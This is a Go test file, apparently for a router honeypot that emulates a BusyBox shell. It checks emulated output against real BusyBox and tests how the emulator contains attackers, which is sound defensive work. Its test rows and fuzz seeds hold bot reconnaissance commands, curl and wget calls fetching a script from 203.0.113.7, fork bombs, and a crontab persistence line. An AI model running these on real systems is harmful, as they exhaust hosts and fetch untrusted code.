		{`grep -c a /tmp/t; grep -v a /tmp/t; grep -n d /tmp/t; grep -i A /tmp/t; grep -q c /tmp/t && echo q; grep -E 'a|f' /tmp/t; grep '^c' /tmp/t; grep 'd e$' /tmp/t; grep -w c /tmp/t`, "1\nc d e\n\nf\n2:c d e\na b\nq\na b\nf\nc d e\nc d e\nc d e\n", 0},
		{`grep -o 'c d' /tmp/t; grep -l a /tmp/t /tmp/n; grep -h 1 /tmp/n /tmp/t | head -2; grep a /tmp/t /tmp/n; grep -e a -e f /tmp/t; grep x /nofile; echo $?; grep; echo $?`, "c d\n/tmp/t\n1\n10\n/tmp/t:a b\na b\nf\ngrep: /nofile: No such file or directory\n2\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: grep [-HhnlLoqvsriwFE] [-m N] [-A/B/C N] PATTERN/-e PATTERN.../-f FILE [FILE]...\n\nSearch for PATTERN in FILEs (or stdin)\n\n\t-H\tAdd 'filename:' prefix\n\t-h\tDo not add 'filename:' prefix\n\t-n\tAdd 'line_no:' prefix\n\t-l\tShow only names of files that match\n\t-L\tShow only names of files that don't match\n\t-c\tShow only count of matching lines\n\t-o\tShow only the matching part of line\n\t-q\tQuiet. Return 0 if PATTERN is found, 1 otherwise\n\t-v\tSelect non-matching lines\n\t-s\tSuppress open and read errors\n\t-r\tRecurse\n\t-i\tIgnore case\n\t-w\tMatch whole words only\n\t-x\tMatch whole lines only\n\t-F\tPATTERN is a literal (not regexp)\n\t-E\tPATTERN is an extended regexp\n\t-m N\tMatch up to N times per file\n\t-A N\tPrint N lines of trailing context\n\t-B N\tPrint N lines of leading context\n\t-C N\tSame as '-A N -B N'\n\t-e PTRN\tPattern to match\n\t-f FILE\tRead pattern from file\n2\n", 0},
		{`egrep 'a|f' /tmp/t; fgrep 'a b' /tmp/t; grep -r x /nope; echo $?; grep -x f /tmp/t; grep -c . /tmp/t; grep -F '.' /tmp/t; echo $?`, "a b\nf\na b\ngrep: /nope: No such file or directory\n2\nf\n3\n1\n", 0},
		{`cat /tmp/t | grep -v '^$' | wc -l`, "3\n", 0},
		{`nohup echo hi; echo $?; ls nohup.out`, "hi\n0\nls: nohup.out: No such file or directory\n", 1},
		{`w; echo $?; who; echo $?`, "USER\t\tTTY\t\tIDLE\tTIME\t\t HOST\n0\n0\n", 0},
		{`sleep 0; sleep x; echo $?; sleep; echo $?`, "sleep: invalid number 'x'\n1\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: sleep [N]...\n\nPause for a time equal to the total of the args given, where each arg can\nhave an optional suffix of (s)econds, (m)inutes, (h)ours, or (d)ays\n1\n", 0},
		{`echo $(seq 5) | wc -w`, "5\n", 0},
		{`help`, "Built-in commands:\n------------------\n\t. : [ [[ alias bg break cd chdir command continue echo eval exec\n\texit export false fg getopts hash help history jobs kill let\n\tlocal printf pwd read readonly return set shift source test times\n\ttrap true type ulimit umask unalias unset wait\n", 0},
		{`tr; echo $?`, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: tr [-cds] STRING1 [STRING2]\n\nTranslate, squeeze, or delete characters from stdin, writing to stdout\n\n\t-c\tTake complement of STRING1\n\t-d\tDelete input characters coded STRING1\n\t-s\tSqueeze multiple output characters of STRING2 into one character\n1\n", 0},
		{`seq; echo $?`, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: seq [-w] [-s SEP] [FIRST [INC]] LAST\n\nPrint numbers from FIRST to LAST, in steps of INC.\nFIRST, INC default to 1.\n\n\t-w\tPad to last with leading zeros\n\t-s SEP\tString separator\n1\n", 0},
		{`awk; echo $?`, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: awk [OPTIONS] [AWK_PROGRAM] [FILE]...\n\n\t-v VAR=VAL\tSet variable\n\t-F SEP\t\tUse SEP as field separator\n\t-f FILE\t\tRead program from FILE\n\t-e AWK_PROGRAM\n1\n", 0},
		{`nohup; echo $?`, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: nohup PROG ARGS\n\nRun PROG immune to hangups, with output to a non-tty\n127\n", 0},
		{`date -x; echo $?`, "date: invalid option -- x\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: date [OPTIONS] [+FMT] [TIME]\n\nDisplay time (using +FMT), or set time\n\n\t[-s,--set] TIME\tSet time to TIME\n\t-u,--utc\tWork in UTC (don't convert to local time)\n\t-R,--rfc-2822\tOutput RFC-2822 compliant date string\n\t-I[SPEC]\tOutput ISO-8601 compliant date string\n\t\t\tSPEC='date' (default) for date only,\n\t\t\t'hours', 'minutes', or 'seconds' for date and\n\t\t\ttime to the indicated precision\n\t-r,--reference FILE\tDisplay last modification time of FILE\n\t-d,--date TIME\tDisplay TIME, not 'now'\n\t-D FMT\t\tUse FMT for -d TIME conversion\n\nRecognized TIME formats:\n\thh:mm[:ss]\n\t[YYYY.]MM.DD-hh:mm[:ss]\n\tYYYY-MM-DD hh:mm[:ss]\n\t[[[[[YY]YY]MM]DD]hh]mm[.ss]\n\t'date TIME' form accepts MMDDhhmm[[YY]YY][.ss] instead\n1\n", 0},
		{`type export . exit set test [ printf read`, "export is a special shell builtin\n. is a special shell builtin\nexit is a special shell builtin\nset is a special shell builtin\ntest is a shell builtin\n[ is a shell builtin\nprintf is a shell builtin\nread is a shell builtin\n", 0},
		{`sort /nofile; echo $?`, "sort: /nofile: No such file or directory\n2\n", 0},
		{`uniq /nofile; echo $?`, "uniq: can't open '/nofile': No such file or directory\n1\n", 0},
		{`tail /nofile; echo $?`, "tail: can't open '/nofile': No such file or directory\ntail: no files\n1\n", 0},
		{`cut -f1 /nofile; echo $?`, "cut: /nofile: No such file or directory\n1\n", 0},
		{`sed 's/a/b/' /nofile; echo $?`, "sed: /nofile: No such file or directory\n1\n", 0},
		{`awk 1 /nofile; echo $?`, "awk: /nofile: No such file or directory\n1\n", 0},
		{`tr a; echo $?`, "0\n", 0},
		{`echo a | awk "{print \$1" ; echo $?`, "awk: cmd. line:1: Unexpected end of string\n1\n", 0},
		{`echo a | sed 'z'; echo $?`, "sed: unsupported command z\n1\n", 0},
		{`grep -E "(" /etc/passwd; echo $?`, "grep: bad regex '(': Unmatched ( or \\(\n2\n", 0},
		{`grep "\(" /etc/passwd; echo $?`, "grep: bad regex '\\(': Unmatched ( or \\(\n2\n", 0},
		{`head -n x /etc/passwd; echo $?`, "head: invalid number 'x'\n1\n", 0},
		{`echo x | sed -n p; echo x | sed "s/x/&&/"; echo ab | sed "s/\(a\)\(b\)/\2\1/"; echo aaa | sed -E "s/a+/b/"`, "x\nxx\nba\nb\n", 0},
		{`which -a ls; echo $?`, "/bin/ls\n0\n", 0},
		{`env -x; echo $?`, "env: invalid option -- x\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: env [-iu] [-] [name=value]... [PROG ARGS]\n\nPrint the current environment or run PROG after setting up\nthe specified environment\n\n\t-, -i\tStart with an empty environment\n\t-u\tRemove variable from the environment\n1\n", 0},
		{"printf \"%5.2f|%e|%i|%u\n\" 3.14159 1 -2 3", " 3.14|1.000000e+00|-2|3\n", 0},
		{"printf \"%s %s\n\" a; printf \"%q\n\" a; echo $?", "a \nsh: %q\n: invalid format\n1\n", 0},
	}
	prev := NewShell()
	// the oracle made this file in a line that also used od (not simulated, so not a test row)
	prev.Run(`printf '1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n' > /tmp/n`)
	for _, tt := range tests {
		sh := NewShell()
		sh.files, sh.dirs = prev.files, prev.dirs
		if got, code, _ := sh.Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
		prev = sh
	}
}

// What bots run to size up the machine, on the router's own files. Measured by giving the real
// BusyBox the same text (our /proc/cpuinfo, free -m, df -h, /etc/passwd, /proc/meminfo, ps).
func TestBotSequences(t *testing.T) {
	tests := []struct {
		line string
		want string
		code int
	}{
		{`cat /proc/cpuinfo | grep name | wc -l`, "1\n", 0},
		{`cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`, "ARMv7 Processor rev 5 (v7l) \n", 0},
		{`cat /proc/cpuinfo | grep model | grep name | wc -l`, "1\n", 0},
		{`free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`, "121 57 37 0 26 59\n", 0},
		{`df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`, "60.8M\n", 0},
		{`grep -c processor /proc/cpuinfo`, "1\n", 0},
		{`cat /proc/cpuinfo | grep -m1 'model name' | cut -d: -f2 | sed 's/^ *//'`, "ARMv7 Processor rev 5 (v7l)\n", 0},
		{`awk '/MemTotal/ {print $2}' /proc/meminfo`, "124520\n", 0},
		{`grep MemTotal /proc/meminfo | awk '{print $2/1024}'`, "121.602\n", 0},
		{`awk -F: '$3 == 0 {print $1}' /etc/passwd`, "root\nadmin\nsupport\nuser\n", 0},
		{`cut -d: -f1 /etc/passwd | sort | tr '\n' ' '`, "admin daemon ftp nobody root support user ", 0},
		{`ps | grep -v grep | grep -c sh`, "1\n", 0},
		{`ps | awk 'NR>1 {print $1}' | sort -n | tail -3`, "402\n517\n530\n", 0},
		{`cat /proc/cpuinfo | grep -i 'features' | tr ' ' '\n' | grep -c .`, "15\n", 0},
		{`grep -E '^(model|BogoMIPS)' /proc/cpuinfo | sed 's/\t//g'`, "model name: ARMv7 Processor rev 5 (v7l)\nBogoMIPS: 48.00\n", 0},
		{`cat /proc/meminfo | head -3 | awk '{s+=$2} END {print s}'`, "224140\n", 0},
		{`printf '%s %d\n' cores $(grep -c ^processor /proc/cpuinfo)`, "cores 1\n", 0},
		{`[ $(grep -c processor /proc/cpuinfo) -gt 1 ] && echo multi || echo single`, "single\n", 0},
		{`test -r /etc/passwd && echo readable`, "readable\n", 0},
		{`echo $(awk 'NR==1{print $2}' /proc/meminfo)kB`, "124520kB\n", 0},
	}
	for _, tt := range tests {
		if got, code, _ := NewShell().Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
}

// history lists the lines typed, "%4d %s" from 0 (measured on the real ash with a terminal: empty
// lines and a line equal to the one before are not kept; "history -c" lists, it doesn't clear).
// A command in a pipeline runs in a subshell: what it sets doesn't stay.
func TestHistory(t *testing.T) {
	sh := NewShell()
	for _, line := range []string{"echo a", "echo a", "", "  ", "echo $- $0", "history"} {
		sh.Run(line)
	}
	want := "   0 echo a\n   1   \n   2 echo $- $0\n   3 history\n   4 history -c\n"
	if got, _, _ := sh.Run("history -c"); got != want {
		t.Errorf("history -c:\n got: %q\nwant: %q", got, want)
	}
	if got, _, _ := sh.Run("echo a | read q; cd /tmp | true; X=1 | true; echo [$q] [$X] $PWD"); got != "[] [] /root\n" {
		t.Errorf("pipeline subshells: %q", got)
	}
}

// The login shell's variables, options and prompt. Measured on the real ash, then the login's own
// values where the Docker test differs: SHLVL 1, PPID = telnetd's (356), monitor and stdin on.
func TestLoginEnvironment(t *testing.T) {
	tests := []struct{ line, want string }{
		{"set", "HOME='/root'\nHOSTNAME='gateway'\nIFS=' \t\n'\nLINENO=''\nLOGNAME='root'\nOPTIND='1'\n" +
			"PATH='/bin:/sbin:/usr/bin:/usr/sbin'\nPPID='356'\nPS1='\\u@\\h:\\w\\$ '\nPS2='> '\nPS4='+ '\n" +
			"PWD='/root'\nSHELL='/bin/sh'\nSHLVL='1'\nTERM='vt102'\nUSER='root'\n"},
		{"export", "export HOME='/root'\nexport LOGNAME='root'\nexport PATH='/bin:/sbin:/usr/bin:/usr/sbin'\n" +
			"export PS1='\\u@\\h:\\w\\$ '\nexport PWD='/root'\nexport SHELL='/bin/sh'\nexport SHLVL='1'\n" +
			"export TERM='vt102'\nexport USER='root'\n"}, // TERM: init's on a serial console, kept by telnetd and login
		{"set -o", "errexit         off\nnoglob          off\nignoreeof       off\ninteractive     on\n" +
			"monitor         on\nnoexec          off\nstdin           on\nxtrace          off\nverbose         off\n" +
			"noclobber       off\nallexport       off\nnotify          off\nnounset         off\nvi              off\n" +
			"pipefail        off\n"},
		{"echo $- $$ $PPID $SHLVL $LINENO", "smi 517 356 1 1\n"}, // $$ = -sh in ps
		// env: in the order of ash's variable table (the real env -i ... gave USER SHLVL HOME OLDPWD
		// PS1 LOGNAME TERM PATH SHELL PWD: hashvar buckets 2 5 6 6 10 15 18 21 27 33)
		{"env", "USER=root\nSHLVL=1\nHOME=/root\nPS1=\\u@\\h:\\w\\$ \nLOGNAME=root\nTERM=vt102\nPATH=/bin:/sbin:/usr/bin:/usr/sbin\n" +
			"SHELL=/bin/sh\nPWD=/root\n"},
		{"echo 'echo $-' | sh; sh -c 'echo $-'", "s\n\n"}, // sh reading its input has -s
	}
	for _, tt := range tests {
		if got, _, _ := NewShell().Run(tt.line); got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}

	sh := NewShell()
	sh.Run("cd /tmp")
	sh.Run(`PS1='\h \W \$ '`) // the prompt follows $PS1 (the default one is /etc/profile's)
	if p := sh.Prompt(); p != "gateway tmp # " {
		t.Errorf("prompt after PS1='\\h \\W \\$ ': %q", p)
	}
	if out, _, _ := sh.Run("echo $LINENO"); out != "3\n" { // the login shell counts the lines it read
		t.Errorf("$LINENO on the third line: %q", out)
	}
}

// Lines that would keep a real shell busy for ever (it would run out of processes) stop at the
// shell's limits, quickly and with ash's "can't fork" or math.c's own error.
func TestShellLimits(t *testing.T) {
	chain := "A0=1" // A1 = A0+A0, A2 = A1+A1...: $((A40)) would read A0 2^40 times
	for i := 1; i <= 40; i++ {
		chain += fmt.Sprintf("; A%d='A%d+A%d'", i, i-1, i-1)
	}
	deep := strings.Repeat("$(echo ", 20) + "x" + strings.Repeat(")", 20)
	tests := []struct{ line, want string }{
		{`X='sh -c "$X"'; sh -c "$X"`, "sh: can't fork: Resource temporarily unavailable\n"},  // endless sh -c
		{`X='sh -c "$X;$X"'; sh -c "$X"`, "can't fork"},                                       // doubling: maxCommands
		{`X='eval $X'; eval $X`, "-sh: eval: can't fork: Resource temporarily unavailable\n"}, // (ash: a crash)
		{`echo 'sh /tmp/s' > /tmp/s; sh /tmp/s`, "can't fork"},                                // a script running itself
		{"echo " + deep, "-sh: can't fork: Resource temporarily unavailable\n"},
		{chain + "; echo $((A40)); echo after", "-sh: expression recursion loop detected\n"},
		{`X=X; echo $((X))`, "-sh: expression recursion loop detected\n"},
		{`A='A%=A%=I'; echo $((A))`, "-sh: expression recursion loop detected\n"},                      // A read twice per level (found by FuzzRun)
		{"echo " + strings.Repeat("*/../", 1500) + "*", "*/../*/../"},                                  // globbing stops: left as typed
		{"X=" + strings.Repeat("a", 1000) + "; echo ${X#" + strings.Repeat("*a", 100) + "b}", "aaaaa"}, // no match
		{"X=" + strings.Repeat("a", 2000) + "; echo ${X#*a} ${X/*a/b}", "aaaaa"},                       // too long: as it is
		// one line full of them: the line's work budget (maxWork) runs out, the rest is left as it is
		// none match, each lists everything; after them the budget is gone: /etc/pass* is left as typed
		{"echo " + strings.Repeat("/*/*/*/x ", 300) + "/etc/pass*", "/*/*/*/x /etc/pass*\n"},
		{"X=" + strings.Repeat("a", 1000) + "; echo " + strings.Repeat("${X#"+strings.Repeat("*a", 30)+"b} ", 100), "aaaaa"},
		{"echo $((" + strings.Repeat("1+", 4000) + "1))", "4001\n"},
		// the control structures (6d): endless loops and fork bombs stop at maxCommands
		{"while :; do :; done; echo never", "-sh: can't fork: Resource temporarily unavailable\n"},
		{"until false; do echo y; done", "y\ny\ny\n"},
		{"f() { f | f; }; f", "can't fork"},
		{"for i in 1 2 3 4 5 6 7 8 9; do for j in $(seq 1 99); do for k in $(seq 1 99); do :; done; done; done", "can't fork"},
		{"X=" + strings.Repeat("0", 16000) + "; for i in 1 2 3; do case $X in " + strings.Repeat("*1", 300) + ") ;; esac; done; echo end", "end\n"},
		// background jobs (jobs.go): each one stops after maxBackground commands, a shell keeps maxJobs
		{"while :; do : & done; echo never", "-sh: can't fork: Resource temporarily unavailable\n"},
		{"while :; do (while :; do :; done &); done", "can't fork"}, // a subshell's jobs aren't counted: the budget
		{"f() { f & f; }; f", "can't fork"},
		{"f() { f & f & }; f; echo $!", "can't fork"},
		{"while :; do while :; do :; done & done", "can't fork"},
		// functions live in the agent's RAM like the variables: past varsQuota, "out of memory"
		{"i=0; while :; do i=$((i+1)); eval \"f$i() { echo " + strings.Repeat("x", 500) + "; }\"; done", "-sh: eval: out of memory\n"},
	}
	for _, tt := range tests {
		start := time.Now()
		got, _, _ := NewShell().Run(tt.line)
		if took := time.Since(start); !strings.Contains(got, tt.want) || took > 2*time.Second {
			t.Errorf("Run(%.60q...): %.200q after %v, want %q quickly", tt.line, got, took, tt.want)
		}
	}

	// the applets (6b) can't be made to build huge strings either
	for _, line := range []string{
		`printf '%999999999s|%.999999999d|%0999999999x|%*s' a 1 2 999999999 b`,
		`seq 1 9999999999 | awk '{x = x x "ab"} END {print length(x)}'`,
		`echo a | awk '{NF = 99999999; $99999999 = "x"; print length($0)}'`,
		`seq -w 1 99999999999999`,
		// doubling the parameters on every command, empty ones too (found by FuzzRun: 5.8GB)
		`set -- a; ` + strings.Repeat(`set -- "$@" "$@"; `, 40) + `echo $#`,
		`set -- ''; ` + strings.Repeat(`set -- "$@" "$@"; `, 40) + `echo "x$@y" | wc -c`,
		`X='sh -c "$X$@"'; sh -c "$X" a a a a a a a a`,
	} {
		start := time.Now()
		if got, _, _ := NewShell().Run(line); len(got) > 2*maxSize || time.Since(start) > 2*time.Second {
			t.Errorf("Run(%q): %d bytes after %v", line, len(got), time.Since(start))
		}
	}

	// the variables live in the agent's RAM: past varsQuota, ash's "out of memory"
	sh := NewShell()
	sh.Run("echo " + strings.Repeat("b", maxSize-1) + " > /tmp/b") // 16KB
	got, _, _ := sh.Run("v1=$(cat /tmp/b); v2=$v1; v3=$v1; v4=$v1; v5=$v1; echo never")
	if got != "-sh: out of memory\n" || varsUsed(sh) > varsQuota {
		t.Errorf("five 16KB variables: %q, %d bytes of variables (quota %d)", got, varsUsed(sh), varsQuota)
	}
	// and one command's words are capped like its output
	if got, _, _ := sh.Run("echo $v1$v1$v1$v1$v1$v1"); len(got) > maxSize+1 {
		t.Errorf("echo of 6 x 16KB: %d bytes", len(got))
	}
}

// ${X#p} and ${X/p/r} stop when the line's work budget is gone: the value stays as it is.
func TestPatternWork(t *testing.T) {
	// "*b" is found only at the last try: # tries the shortest prefix first, / the longest piece first
	as := strings.Repeat("a", 50)
	for _, op := range []struct {
		name, value, matched string
		run                  func(string, *int) string
	}{
		{"${X#*b}", as + "b", "", func(v string, w *int) string { return trim(v, "*b", true, false, w) }},
		{"${X//*b/c}", "b" + as, "c" + as, func(v string, w *int) string { return replace(v, "*b", "c", true, w) }},
	} {
		value := op.value
		work := 100 // enough for a couple of tries
		if got := op.run(value, &work); got != value || work >= 0 {
			t.Errorf("%s with a budget of 100: %q, %d left (want the value as it is)", op.name, got, work)
		}
		work = maxWork
		if got := op.run(value, &work); got != op.matched || work <= 0 {
			t.Errorf("%s with the full budget: %q, %d left (want %q)", op.name, got, work, op.matched)
		}
	}
	work := maxWork
	if got := trim("/tmp/a.tar.gz", "*/", true, true, &work); got != "a.tar.gz" {
		t.Errorf("${X##*/}: %q", got)
	}
	// a case pattern too costly for the line's budget doesn't match (nor any after it), a cheap one does
	x := "X=" + strings.Repeat("0", 16000) + "; case $X in "
	if got, _, _ := NewShell().Run(x + strings.Repeat("*0", 300) + ") echo m;; *) echo any;; esac; echo end"); got != "end\n" {
		t.Errorf("costly case pattern: %q", got)
	}
	if got, _, _ := NewShell().Run(x + "*0) echo m;; esac"); got != "m\n" {
		t.Errorf("cheap case pattern: %q", got)
	}
}

// varsUsed is what the session's variables take, counted like setVar does.
func varsUsed(sh *Shell) int {
	used := 0
	for n, v := range sh.vars {
		used += len(n) + len(v) + 64
	}
	return used
}

// Whatever an attacker types, nothing may panic (a panic in one session stops the whole agent) and
// no session gets past its quota. `go test` runs only these seeds; new lines are made up with
// `go test -fuzz=FuzzRun -fuzztime=2m ./internal/vfs/` (a crash is saved in testdata/fuzz/FuzzRun).
func FuzzRun(f *testing.F) {
	for _, seed := range []string{
		"echo hi>x; cat x", "cat /nofile >/dev/null 2>&1", "echo b >; echo c", "> > >", "2>&1 2>&- <&0 <<x",
		"(echo a; echo b) | grep a", `echo "a'b" 'c"d' "2">x`, "cat < /etc/passwd | grep root &>f &", "(((", ")))",
		"a&>b&&c||d|e;f\ng", "echo x >&99999999 >&-", "cd /tmp; mkdir a; cd a; touch b; cp b ../c; rm b",
		// expansions (6a): every kind, nested, unfinished
		`X="a  b"; echo $X "$X" ${X:-d} ${#X} ${X%b} ${X/a/c} ${X:1:2} $((1+2*3)) $(echo $X) "$(id)" ` + "`pwd`",
		`echo ~/x /etc/pass* "$@" $* $# $? $$ ${1} ${x?no}`, `sh -c 'echo $0 "$1"; exit 3' n a; echo $?`,
		`eval 'X=$((X+1))'; . /etc/profile; set -- a b; shift; echo $@; export Y=1; unset Y; set`,
		`echo $(( (1 ? 2 : 3) ** 2 << 1, x = 4, x++ )) $((`, `echo "$(echo "$(echo '` + "`" + `')")" ${ $( `,
		`X='sh -c "$X"'; sh -c "$X"`, `(cd /tmp; exit 4); echo $?; echo '#!/bin/sh' > /tmp/s; /tmp/s`,
		// the applets (6b): their own little languages
		`cat /proc/cpuinfo | grep -E '^(model|Bogo)' | awk -F: '{print $2; n++} END {printf "%d %s\n", n, NR}'`,
		`ps | awk 'NR>1 && $1 ~ /^[0-9]+$/ {s += $1; $2 = "x"; print NF, $NF, length($0), substr($5, 2, 3)}'`,
		`sed -n -e '1,/root/p; $d; s/\(a\)\(b\)*/\2\1&/2gp; /x/!=' /etc/passwd | tr -s 'a-z' 'A-Z' | sort -rn -k2 -t: | uniq -c`,
		`printf '%-5.2s|%05d|%x|%b|%c|%q' a 1 2 'a\tb' xyz; [ -f /etc/passwd -a ! -d /x ] && test 1 -le 2 -o x = y`,
		`date -u -d @86400 '+%A %j %Z %z %s'; grep -rnw -m1 -e root -e '[[:digit:]]\{3\}' /etc; head -c 5 /etc/hosts; tail -n +2 -c +3 /etc/hosts`,
		`env -i A=1 env; which ls nosuch; type cd ls x; command -v sh; read a b < /etc/hosts; echo $a; seq -s, -w 3 -1 -9; history`,
		// downloads, uname, hostname, sysctl, /proc (6c)
		`wget -qnv --out=x -T 5 --no -U a 'http://u@[::1]:80/a?b' ftp://h:0/ 1.2.3.4:x; tftp -g -r a/b -l - -b 512 gateway 69`,
		`ftpget -v -P 21 -u a -p b localhost x y; uname -snrvmpio --mach --k -a; hostname -F /etc/hosts; hostname -fids`,
		`sysctl -w a.b..c=0x1f vm.swappiness=-0 -n -e -q; sysctl -p /etc/hosts; sysctl -a; echo 010 > /proc/sys/kernel/pid_max`,
		// background jobs: stopped at sleep, reports, jobs / wait / fg / bg / kill
		`while :; do ./x; sleep 60; done & a | b & { c; sleep 1; } & jobs -lp; wait %1 $!; kill -9 %- %+ 99; fg %2; bg`,
		`f() { f & f; }; (f &) & X=1 echo "$a" 'b' \c ${d:-e} >f 2>&1 & echo $!; sleep 0 & wait; jobs`,
		// the processes in /proc: links on the way, self, writes
		`for p in /proc/[0-9]*; do cat $p/cmdline $p/stat; done; cd /proc/self/; ls -la . ..; cat ../1/root/proc/self/status`,
		`echo -1 > /proc/self/oom_score_adj; ls -lL /proc/self/exe /proc/self/; /proc/1/exe; cat /proc/530/environ < /proc/self/comm`,
		// the control structures (6d)
		"for i in 1 2; do while read x; do case $x in a*|[b]) break 2;; *) continue;; esac; done < /etc/hosts; done > /tmp/o",
		"f() { local a=$1 b; shift; [ $# -gt 0 ] && f \"$@\" || return 3; }; f a b c; echo $?; unset -f f; type f",
		"if ! false; then { echo a; } 2>&1 | (read x; echo $x); elif true; then :; else until :; do :; done; fi",
		"function g { g; }; g", "case x in (x|y) ;; esac; for; while do; f() {", "{ ( { (", "[[ a && b || c ]]; echo }",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, line string) {
		sh := NewShell()
		sh.Run(line)
		sh.Run(line) // again, over what the first run created (or after it, if it left a command unfinished)
		sh.EndOfInput(io.Discard, io.Discard)
		if used := sh.quotaUsed(); used > sessionQuota {
			t.Errorf("Run(%q): %d bytes used, quota %d", line, used, sessionQuota)
		}
		if used := varsUsed(sh); used > varsQuota {
			t.Errorf("Run(%q): %d bytes of variables, quota %d", line, used, varsQuota)
		}
		// the SSH shells: sh -c with the whole input (it may hold newlines), the login shell without a pty
		NewSSHShell("root", nil, false, true).Run(line)
		NewSSHShell("root", nil, false, false).Run(line)
	})
}

// Run returns the exit code of the last command that ran, like $? (SSH sends it to the client).
func TestExitCodes(t *testing.T) {
	tests := []struct {
		line string
		want int
	}{
		{"whoami", 0},
		{"nosuchcmd", 127},
		{"curl http://203.0.113.7/x.sh", 127},
		{"cat /missing", 1},
		{"wget http://203.0.113.7/x", 1},
		{"false && echo never", 1}, // echo is skipped, so $? stays 1
		{"nosuchcmd || true", 0},
		{"lighttpd", 0}, // a program in PATH that isn't an applet: "runs" silently
		{"/usr/sbin/dropbear", 0},
		{"cat /etc/hostname | grep nomatch", 1}, // a pipe's code is its last command's
		{"free -h", 1},                          // BusyBox's free has no -h: usage
		{"nproc && free -m && df -h && uptime", 0},
		{"df /nope", 1},
		{"crontab -l", 1}, // no crontab yet
		{"echo '* * * * * x' | crontab - && crontab -l", 0},
		{"", 0},
	}
	for _, tt := range tests {
		if _, code, _ := NewShell().Run(tt.line); code != tt.want {
			t.Errorf("Run(%q): exit code %d, want %d", tt.line, code, tt.want)
		}
	}
}

// exit ends the session: nothing after it runs.
func TestExit(t *testing.T) {
	out, _, exit := NewShell().Run("echo bye; exit; echo never-printed")
	if out != "bye\n" || !exit {
		t.Errorf("got %q, exit=%v", out, exit)
	}
}

// The prompt follows the current directory.
func TestPrompt(t *testing.T) {
	sh := NewShell()
	if p := sh.Prompt(); p != "root@gateway:~# " {
		t.Errorf("prompt at start: %q", p)
	}
	sh.Run("cd /tmp")
	if p := sh.Prompt(); p != "root@gateway:/tmp# " {
		t.Errorf("prompt after cd /tmp: %q", p)
	}
}

// Two attackers must not see each other's files or current directory.
func TestSessionsAreSeparate(t *testing.T) {
	a := NewShell()
	b := NewShell()
	a.Run("cd /tmp; echo secret > x")

	if out, _, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
		t.Errorf("b sees a's file: %q", out)
	}
	if out, _, _ := b.Run("pwd"); out != "/root\n" {
		t.Errorf("b has a's directory: %q", out)
	}
}

// fixedClock makes the ls -l dates predictable: "now" is Nov 20 2026 10:30, the boot was 2 days before.
func fixedClock(t *testing.T) {
	oldNow, oldBoot := now, bootTime
	now = func() time.Time { return time.Date(2026, time.November, 20, 10, 30, 0, 0, time.UTC) }
	bootTime = time.Date(2026, time.November, 18, 9, 15, 0, 0, time.UTC)
	t.Cleanup(func() { now, bootTime = oldNow, oldBoot })
}

// ls like BusyBox 1.30: columns, hidden files, several targets and the -l line
// ("%-10s %4d %-8s %-8s %9s" + date + name, the same printf as in BusyBox's ls.c).
func TestLs(t *testing.T) {
	fixedClock(t)
	const nippon = "cd /tmp; echo kami > .nippon; mkdir d; " // a bot's hidden file + a directory
	tests := []struct{ line, want string }{
		{"ls /", "bin   dev   etc   home  lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
		{"ls -1 /var", "log\nrun\nspool\ntmp\nwww\n"},
		{"ls --color=auto /var", blue("log") + "    " + blue("run") + "    " + blue("spool") + "  " + blue("tmp") + "    " + blue("www") + "\n"}, // --color=auto beats LS_COLORS on a terminal
		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},

		// hidden files (.x) only with -a or -A, or when named
		{nippon + "ls", "d\n"},
		{nippon + "ls -a", ".        ..       .nippon  d\n"},
		{nippon + "ls -A", ".nippon  d\n"},
		{nippon + "ls .nippon", ".nippon\n"},

		// -l: firmware files from 2020 (older than 6 months -> year), /tmp /var /dev /proc from boot,
		// the attacker's files from "now"
		{"ls -la", "total 0\n" + // (1 + the entries' 512-byte blocks) / 2; directories take none
			"drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
			"drwxr-xr-x   15 root     root           300 Jun  4  2020 ..\n"},
		{"ls -l /var/run", "total 8\n" + // two files of one 4KB page each
			"-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n" +
			"-rw-r--r--    1 root     root             4 Nov 18 09:15 lighttpd.pid\n"},
		{"ls -l /bin/sh /bin/busybox /dev/null",
			"-rwxr-xr-x    1 root     root        278412 Jun  4  2020 /bin/busybox\n" +
				"lrwxrwxrwx    1 root     root             7 Jun  4  2020 /bin/sh -> busybox\n" +
				"crw-rw-rw-    1 root     root        1,   3 Nov 18 09:15 /dev/null\n"},
		{"ls -l /usr/bin/wget /proc/cpuinfo",
			"-r--r--r--    1 root     root             0 Nov 18 09:15 /proc/cpuinfo\n" +
				"lrwxrwxrwx    1 root     root            17 Jun  4  2020 /usr/bin/wget -> ../../bin/busybox\n"},
